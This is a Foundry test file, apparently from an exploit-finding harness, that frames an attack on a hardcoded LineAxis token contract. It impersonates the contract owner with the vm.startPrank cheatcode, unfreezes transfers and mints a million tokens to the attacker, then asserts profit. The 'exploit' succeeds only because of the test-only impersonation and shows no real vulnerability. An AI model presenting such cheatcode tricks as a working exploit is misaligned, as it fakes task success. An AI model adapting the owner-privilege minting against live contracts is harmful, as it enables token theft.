// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface LineAxis {
    function owner() external view returns (address);
    function mint(address to, uint value) external;
    function frozen() external view returns (bool);
    function unfreezeTransfers() external;
    function freezeTransfers() external;
    function balanceOf(address owner) external view returns (uint);
    function decimals() external view returns (uint);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use cheatcodes during the exploit
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28).balanceOf(address(this));
        // Get the current owner
        LineAxis token = LineAxis(TARGET);
        address currentOwner = token.owner();

        // Impersonate the owner
        vm.startPrank(currentOwner);

        // Check if transfers are frozen and unfreeze if needed
        bool frozen = token.frozen();
        if (frozen) {
            token.unfreezeTransfers();
        }

        // Mint a large amount of tokens to the attacker (address(this))
        uint256 initialTokenBalance = token.balanceOf(attacker);
        uint256 mintAmount = 1_000_000 * 10**token.decimals();
        token.mint(attacker, mintAmount);

        vm.stopPrank();

        // Verify the attacker's balance increased
        uint256 finalTokenBalance = token.balanceOf(attacker);
        assertGt(finalTokenBalance, initialTokenBalance, "Attacker balance should increase");
        uint256 finalERC20Balance = IERC20(0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
